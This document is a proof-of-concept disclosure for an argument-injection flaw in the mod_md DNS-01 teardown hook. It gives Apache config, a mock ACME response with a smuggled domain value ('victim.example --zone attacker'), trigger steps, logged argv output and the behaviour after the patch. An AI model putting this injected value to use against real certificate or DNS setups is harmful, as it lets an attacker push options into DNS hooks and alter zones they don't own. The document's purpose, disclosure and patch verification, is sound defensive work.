# PoC 067 - DNS-01 Teardown Hook Argument Injection

When `DNS01_VERSION=2` is set, `cha_dns_01_teardown()` skips the
space-truncation of the domain and reuses the same `apr_psprintf` +
`apr_tokenize_to_argv` pattern as setup. Whitespace in `authz->domain`
becomes additional argv elements to the configured DNS hook.

## Setup

Same as PoC 066 plus the v2 teardown opt-in:

`conf/httpd.conf`:

```
ServerName 127.0.0.1
Listen 127.0.0.1:8080
LoadModule watchdog_module modules/mod_watchdog.so
LoadModule md_module       modules/mod_md.so

MDCertificateAuthority http://127.0.0.1:14000/dir
MDChallengeDns01 /tmp/poc067/dnshook.sh
MDChallengeDns01Version 2
MDDriveMode auto
MDomain "victim.example --zone attacker"
```

Hook script identical to PoC 066 (records argv to a file). Make sure the
process environment also exports the version flag, since some `mod_md`
builds key on the env var rather than the directive:

```
export DNS01_VERSION=2
```

Mock ACME server returns:

```json
{ "identifier": { "type": "dns",
                  "value": "victim.example --zone attacker" },
  "challenges": [{ "type": "dns-01",
                   "token": "TTTTTOKEN" }] }
```

After setup completes (token written to the zone), `mod_md` issues
teardown. To shorten the loop, force teardown by deleting the cached
authorization state and bouncing httpd:

```
rm -rf $PWD/md/staging/*
```

## Trigger

```
python3 /tmp/poc067/acme.py &
DNS01_VERSION=2 httpd -X -f $PWD/conf/httpd.conf
# Wait for the drive loop to call teardown, or send SIGTERM to httpd
# after setup so teardown runs on the next start.
```

## Observed effect

`/tmp/poc067/argv.log` confirms argument shifting against a teardown
invocation:

```
argc=5
argv[1]=<teardown>
argv[2]=<victim.example>
argv[3]=<--zone>
argv[4]=<attacker>
```

(`<dns-token>` follows on the next line if the hook is invoked with the
trailing token. The exact tail depends on whether the teardown token format
includes the original dns-01 challenge token; what matters here is that
`--zone` and `attacker` reached the hook as separate argv elements.)

A real BIND / nsupdate / cloud-DNS hook that accepts `--zone <name>` or
`--ttl <int>` would now receive attacker-supplied values for those options,
potentially mutating an unintended zone or interfering with subsequent
records owned by the victim. With the patch applied, `dns01_cmd` is
tokenized only once into its configured argv, then `teardown` and the
domain are appended as exactly two argv slots:

```
argc=3
argv[1]=<teardown>
argv[2]=<victim.example --zone attacker>
```
